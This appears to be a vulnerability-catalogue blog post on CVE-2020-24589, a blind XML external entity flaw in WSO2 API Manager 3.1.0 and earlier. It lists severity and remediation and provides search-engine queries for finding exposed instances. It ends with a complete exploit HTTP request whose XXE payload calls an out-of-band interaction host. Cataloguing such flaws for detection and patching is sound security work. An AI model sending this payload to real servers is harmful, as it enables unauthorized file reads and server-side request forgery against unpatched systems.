---
layout: post
cve_id: CVE-2020-24589
title: WSO2 API Manager <=3.1.0 - Blind XML External Entity Injection
pcap: true
pcap_path: /pcaps/2020/CVE-2020-24589.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-24589.yaml
snort2_rule: N/A
snort3_rule: N/A
author: lethargynavigator
severity: critical
impact: 'Successful exploitation of this vulnerability could lead to unauthorized
  access to sensitive information, denial of service, or server-side request forgery.

  '
remediation: 'Upgrade to a patched version of WSO2 API Manager (3.1.1 or above) or
  apply the provided security patch.

  '
reference:
- https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2020-0742
- https://nvd.nist.gov/vuln/detail/CVE-2020-24589
- https://github.com/ARPSyndicate/kenzer-templates
- https://github.com/athiththan11/WSO2-CVE-Extractor
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H
  cvss-score: 9.1
  cve-id: CVE-2020-24589
  cwe-id: CWE-611
  epss-score: 0.90156
  epss-percentile: 0.99566
  cpe: cpe:2.3:a:wso2:api_manager:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: wso2
  product: api_manager
  shodan-query: http.favicon.hash:1398055326
  fofa-query: icon_hash=1398055326
  google-query: inurl:"carbon/admin/login"
tags:
- cve2020
- cve
- wso2
- xxe
- oast
- blind
- vkev
- vuln
---

## ðŸ” Vulnerability Description
WSO2 API Manager 3.1.0 and earlier is vulnerable to blind XML external entity injection (XXE). XXE often allows an attacker to view files on the server file system, and to interact with any backend or external systems that the application itself can access which allows the attacker to transmit sensitive data from the compromised server to a system that the attacker controls.

## ðŸŒ HTTP Request
```nohighlight
POST /carbon/generic/save_artifact_ajaxprocessor.jsp HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Safari/605.1.15
Connection: close
Content-Length: 142
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
payload=<%3fxml+version%3d"1.0"+%3f><!DOCTYPE+a+[+<!ENTITY+%25+xxe+SYSTEM+"http%3a//d5iv7iple0o2fh4tf91gup1nrx68t71kd.oast.online">%25xxe%3b]>
```

